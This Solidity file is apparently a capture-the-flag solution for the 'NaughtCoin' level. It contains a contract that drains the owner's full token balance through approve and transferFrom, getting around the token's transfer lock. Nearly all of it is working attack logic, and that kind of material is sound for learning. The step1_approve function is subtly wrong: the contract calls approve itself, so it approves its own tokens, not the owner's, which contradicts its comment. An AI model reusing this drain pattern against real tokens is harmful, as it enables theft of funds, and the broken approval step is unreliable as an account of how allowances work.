// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface INaughtCoin {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract ExploitNaughtCoin {
    INaughtCoin public naughtCoin;
    address public owner;
    
    constructor(address _naughtCoin) {
        naughtCoin = INaughtCoin(_naughtCoin);
        owner = msg.sender;
    }
    
    // Step 1: Owner must call this to approve this contract
    function step1_approve() external {
        require(msg.sender == owner, "Only owner");
        uint256 balance = naughtCoin.balanceOf(owner);
        naughtCoin.approve(address(this), balance);
    }
    
    // Step 2: Transfer tokens from owner to this contract
    function step2_transfer() external {
        uint256 balance = naughtCoin.balanceOf(owner);
        naughtCoin.transferFrom(owner, address(this), balance);
    }
    
    // All in one (but requires prior approval)
    function drainTokens() external {
        uint256 balance = naughtCoin.balanceOf(owner);
        require(naughtCoin.transferFrom(owner, address(this), balance), "Transfer failed");
    }
}